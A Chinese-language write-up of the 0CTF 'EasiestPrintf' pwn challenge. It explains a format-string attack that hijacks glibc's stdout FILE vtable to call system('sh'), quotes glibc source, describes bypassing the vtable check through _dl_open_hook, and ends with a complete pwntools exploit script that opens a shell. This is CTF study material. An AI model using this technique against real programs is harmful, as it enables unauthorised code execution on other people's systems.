# 0ctf 'EasiestPrintf' writeup

这道题是赛后做的。程序逻辑很简单，先给一个能 leak 任意地址的函数。然后读取159个字节到 buffer 中，然后printf(buffer)， 触发格式化字符串漏洞

### 错误的思路

思路1. 修改 got 表，不可行， checksec 发现开启了`RELRO:FULL`, got 表只读

思路2. 修改 printf 的返回地址，stack 地址随机，alloca 的地址也随机。先 leak 出 stack 地址，然后暴力破解。除了 stack，没有其他合适的地方可以 leak 出 stack 地址。因为 stack 本身就是随机的，总不能从 stack 中 leak 出 stack 地址吧。这条思路不行。

### 正确的思路

先 leak 出 libc 的地址， printf 用到了stdout这个 FILE *指针，这个结构体里的虚表指针是可以修改的。IO_FILE Struct 大小是148， 偏移148的位置是 vtable ptr， vtable 指向的函数指针数组是只读的，但是我们可以修改 vtable 指针指向另一片地址。

因为 printf 可以任意地址写，所以我们可以把在libc 的数据段，`_IO_2_1_stdout_`的附近填上一个system 函数的地址，然后在`_IO_2_1_stdout_`处填上`sh\x00`，因为调用虚表中的函数的第一个参数就是 this 指针，所以 this 指针指向的地方要是字符串`sh\x00`。然后让虚表指针指向system 地址减去7 * 4的地方。为什么是7 * 4呢，因为运行 printf 的时候会调用`_IO_xsputsn`这个函数，而这个函数是在虚表中的第七项。

```C
308	struct _IO_jump_t
309	{
310	    JUMP_FIELD(size_t, __dummy);
311	    JUMP_FIELD(size_t, __dummy2);
312	    JUMP_FIELD(_IO_finish_t, __finish);
313	    JUMP_FIELD(_IO_overflow_t, __overflow);
314	    JUMP_FIELD(_IO_underflow_t, __underflow);
315	    JUMP_FIELD(_IO_underflow_t, __uflow);
316	    JUMP_FIELD(_IO_pbackfail_t, __pbackfail);
317	    /* showmany */
318	    JUMP_FIELD(_IO_xsputn_t, __xsputn);  //printf 会调用这个
319	    JUMP_FIELD(_IO_xsgetn_t, __xsgetn);
320	    JUMP_FIELD(_IO_seekoff_t, __seekoff);
321	    JUMP_FIELD(_IO_seekpos_t, __seekpos);
322	    JUMP_FIELD(_IO_setbuf_t, __setbuf);
323	    JUMP_FIELD(_IO_sync_t, __sync);
324	    JUMP_FIELD(_IO_doallocate_t, __doallocate);
325	    JUMP_FIELD(_IO_read_t, __read);
326	    JUMP_FIELD(_IO_write_t, __write);	//一开始以为调用这个
327	    JUMP_FIELD(_IO_seek_t, __seek);
328	    JUMP_FIELD(_IO_close_t, __close);
329	    JUMP_FIELD(_IO_stat_t, __stat);
330	    JUMP_FIELD(_IO_showmanyc_t, __showmanyc);
331	    JUMP_FIELD(_IO_imbue_t, __imbue);
332	#if 0
333	    get_column;
334	    set_column;
335	#endif
336	};
```

一开始错误的以为会调用虚表中的 write 函数，后来发现不是调用这个。exp 比较简单，用了 pwntools 的 fmtstr 模块来生成 format string，fmtstr 模块需要提供几个参数，其中offset参数就等同于计算 format string 的起始地址相当于 printf 的第几个参数（从0开始）。

但是要注意的是写入的时候要有个顺序，为了不影响程序的逻辑，虚表的指针要最后改写。但是 fmtstr 这个模块是将在哪里写入什么的信息打包成一个字典的，而字典是不保证内部的顺序和代码中插入的顺序一致的。但是这次运气比较好，尝试了在几个不同的地方写入 system 函数地址，最后字典中 vtable 项都是排在最后面的，所以没有问题。如果以后碰到这种对顺序有要求的问题的话或许可以考虑修改一下字典中 key的值 来改变顺序，或者把 pwntools 的源码改了2333.



## IO_Validate_vtable

在使用 vtable ptr 之前还会先检查一下这个指针合不合法

```C
	static inline const struct _IO_jump_t *
932	IO_validate_vtable (const struct _IO_jump_t *vtable)
933	{
934	  /* Fast path: The vtable pointer is within the 		__libc_IO_vtables
935	     section.  */
936	  uintptr_t section_length = __stop___libc_IO_vtables - __start___libc_IO_vtables; //这两个值到底是什么没搞清楚，猜测是一个 section 的两头
937	  const char *ptr = (const char *) vtable;
938	  uintptr_t offset = ptr - __start___libc_IO_vtables;
939	  if (__glibc_unlikely (offset >= section_length))
940	    /* The vtable pointer is not in the expected section.  Use the
941	       slow path, which will terminate the process if necessary.  */
942	    _IO_vtable_check ();
943	  return vtable;
944	}
945	
```

```C
	void attribute_hidden
39	_IO_vtable_check (void)
40	{
41	#ifdef SHARED
42	  /* Honor the compatibility flag.  */
43	  void (*flag) (void) = atomic_load_relaxed (&IO_accept_foreign_vtables);
44	#ifdef PTR_DEMANGLE
45	  PTR_DEMANGLE (flag);
46	#endif
47	  if (flag == &_IO_vtable_check)
48	    return;
49	
50	  /* In case this libc copy is in a non-default namespace, we always
51	     need to accept foreign vtables because there is always a
52	     possibility that FILE * objects are passed across the linking
53	     boundary.  */
54	  {
55	    Dl_info di;
56	    struct link_map *l;
57	    if (_dl_open_hook != NULL
58	        || (_dl_addr (_IO_vtable_check, &di, &l, NULL) != 0
59	            && l->l_ns != LM_ID_BASE))
60	      return;
61	  }
62	
63	#else /* !SHARED */
64	  /* We cannot perform vtable validation in the static dlopen case
65	     because FILE * handles might be passed back and forth across the
66	     boundary.  Therefore, we disable checking in this case.  */
67	  if (__dlopen != NULL)
68	    return;
69	#endif
70	
71	  __libc_fatal ("Fatal error: glibc detected an invalid stdio handle\n");
72	}
```
其中`stop___libc_IO_vtables` 和` __start___libc_IO_vtables`这两个值具体是什么不太清除，我是让 vtable 指向`_IO_2_1_stdout_`邻近的区域，在 libc 的可读写段，虽然原来的 vtable ptr 是指向 libc 的只读段，但是并没有出现问题。看了一下自己电脑使用的libc 2.23版本，并没有在文件里面找到有定义这个函数。himyth 的做法是把 dl_open_hook置为非0，就能绕过这个 check 了。



最后是 exp

```python
#!/usr/bin/env python
# -*- coding: utf-8 -*-
""" dddong / AAA """

from pwn import *
import sys, os, re
context(arch='i386', os='linux', log_level='info')
context(terminal=['gnome-terminal', '-x', 'bash', '-c'])

def __get_base(p, _path):
    _vmmap = open('/proc/%d/maps' % p.proc.pid).read()
    _regex = '^.* r-xp .* {}$'.format(_path)
    _line = [_ for _ in _vmmap.split('\n') if re.match(_regex, _)][0]
    return int(_line.split('-')[0], 16)

def gen_rop(func_addr, args):
    """
    automate generate rop function
    _gadgets array contains gadgets address for 0,1,2,... args
    """
    _gadgets = []
    rop = ""
    rop += p32(func_addr)
    if len(args) > 1:
        rop += _gadgets[len(args)]
        for arg in args:
            rop += p32(args)
    return rop


_program = 'EasiestPrintf'
_pwn_remote = 0
_debug = int(sys.argv[1]) if len(sys.argv) > 1 else 0

elf = ELF('./' + _program)

if _pwn_remote == 0:
    os.environ['LD_PRELOAD'] = ''
    libc = ELF('./libc.so.6')
    p = process('./' + _program)

    if _debug != 0:
        if elf.pie:
            _bps = [] #breakpoints defined by yourself, not absolute addr, but offset addr of the program's base addr
            _offset = __get_base(p, os.path.abspath(p.executable))
            _source = '\n'.join(['b*%d' % (_offset + _) for _ in _bps])
        else:
            _source = 'source peda-session-%s.txt' % _program
        gdb.attach(p.proc.pid, execute=_source)
else:
    libc = ELF('./libc6-i386_2.19-0ubuntu6.9_amd64.so') #todo
    p = remote('8.8.8.8', 4002)	#todo


#leak libc
p.sendlineafter("wanna read:\n", str(elf.symbols['stdout']))
libc_stdout_addr = int(p.recvline().strip(), 16)
vtable_addr = libc_stdout_addr + 148

libc.address = libc_stdout_addr - libc.symbols['_IO_2_1_stdout_']
print "libc base addr:", hex(libc.address)

#input format string
io_putsn_addr = libc_stdout_addr - 64

writes = {
        libc_stdout_addr: u32('sh\x00\xfb'),
        io_putsn_addr : libc.symbols['system'],
        vtable_addr: io_putsn_addr - 7 * 4
        }

payload = fmtstr_payload(offset=7, writes=writes, write_size='short')

print repr(payload)
log.info("payload length: %d" % len(payload))

if '\n' is payload:
    log.error("Error!\\n in payload.")
if len(payload) > 159:
    log.error("Error!paylaod too long!exceed 159")

raw_input("attach")
p.sendline(payload)
p.recvrepeat(timeout=1)
p.interactive()
```



## himyth 的 writeup 的补充部分

### 参数

实际会调用 vtable 中的 `_IO_sputn`，即第 8 项指针，但是发现第一个参数是 stdout 结构体本身，为了让 system 工作起来，需要让第一个参数是 sh 的字符串。

所以这里解法是在把 stdout 头上写成 'sh'，这个结构体原来的头上是一个 `magic | flag`，没有太大的作用，所以可搞。

同样后来看别人的 wp，他让跳转过去的地址变成 system + 1，跳过了第一句 `push ebp`，使得整个栈上移了 4 字节，原先的第二个参数变成了第一个参数，直接就 system('sh') 了，相当的妙，破坏栈并不用考虑，因为 system 压根没想让他返回。

这样都考虑上就可以完整的打了。

### 相关源代码

当 `_IO_vfprintf_internal` 发现输出流是 unbuffered，就会调用 `buffered_vfprintf`，程序本身调用了 setvbuf，所以这里会进这个分支

```c
// _IO_vfprintf_internal() 

1290      if (UNBUFFERED_P (s))
1291        /* Use a helper function which will allocate a local temporary buffer
1292           for the stream and then call us again.  */
1293        return buffered_vfprintf (s, format, ap);
```

`buffered_vfprintf` 中调用 `_IO_vfprintf` 完成格式化字符串之后，调用了 `_IO_sputn` 来输出结果

```c
// buffered_vfprintf() 

2325      result = _IO_vfprintf (hp, format, args);

2344      if ((to_flush = hp->_IO_write_ptr - hp->_IO_write_base) > 0)
2345        {
2346          if ((int) _IO_sputn (s, hp->_IO_write_base, to_flush) != to_flush)
2347            result = -1;
2348        }
```

`_IO_sputn` 是一个宏，相关的展开如下，最终，会调用 `IO_validate_vtable` 检查 vtable，并且调用 vtable 的第 8 项。

```
398 #define _IO_sputn(__fp, __s, __n) _IO_XSPUTN (__fp, __s, __n)

191 #define _IO_XSPUTN(FP, DATA, N) JUMP2 (__xsputn, FP, DATA, N)

140 #define JUMP2(FUNC, THIS, X1, X2) (_IO_JUMPS_FUNC(THIS)->FUNC) (THIS, X1, X2)

133 # define _IO_JUMPS_FUNC(THIS) (IO_validate_vtable (_IO_JUMPS_FILE_plus (THIS)))

119 #define _IO_JUMPS_FILE_plus(THIS) \
120   _IO_CAST_FIELD_ACCESS ((THIS), struct _IO_FILE_plus, vtable)
```

`IO_validate_vtable` 会检查 vtable 是否位于 `__start___libc_IO_vtables - __stop___libc_IO_vtables` 中，如果不在其中，则会调用 `_IO_vtable_check`。后者的检查中，可以通过设置 `_dl_open_hook` 为非零值来跳过最后的 `__libc_fatal`。2.19 中没有这个检查

```c
931 static inline const struct _IO_jump_t *
932 IO_validate_vtable (const struct _IO_jump_t *vtable)
933 {
934   /* Fast path: The vtable pointer is within the __libc_IO_vtables
935      section.  */
936   uintptr_t section_length = __stop___libc_IO_vtables - __start___libc_IO_vtables;
937   const char *ptr = (const char *) vtable;
938   uintptr_t offset = ptr - __start___libc_IO_vtables;
939   if (__glibc_unlikely (offset >= section_length))
940     /* The vtable pointer is not in the expected section.  Use the
941        slow path, which will terminate the process if necessary.  */
942     _IO_vtable_check ();
943   return vtable;
944 }

38  void attribute_hidden
39  _IO_vtable_check (void)
40  {
42    /* Honor the compatibility flag.  */
43    void (*flag) (void) = atomic_load_relaxed (&IO_accept_foreign_vtables);
44  #ifdef PTR_DEMANGLE
45    PTR_DEMANGLE (flag);
46  #endif
47    if (flag == &_IO_vtable_check)
48      return;
49  
50    /* In case this libc copy is in a non-default namespace, we always
51       need to accept foreign vtables because there is always a
52       possibility that FILE * objects are passed across the linking
53       boundary.  */
54    {
55      Dl_info di;
56      struct link_map *l;
57      if (_dl_open_hook != NULL
58          || (_dl_addr (_IO_vtable_check, &di, &l, NULL) != 0
59              && l->l_ns != LM_ID_BASE))
60        return;
61    }
71    __libc_fatal ("Fatal error: glibc detected an invalid stdio handle\n");
72  }
```



### 参考文献

[FILE结构体的定义](https://code.woboq.org/userspace/glibc/libio/libioP.h.html#_IO_jump_t)

https://outflux.net/blog/archives/2011/12/22/abusing-the-file-structure/

http://blog.hostilefork.com/where-printf-rubber-meets-road/

[pwntools的 fmtstr 模块](https://github.com/Gallopsled/pwntools/blob/ac386877d1/pwnlib/fmtstr.py#L103-178)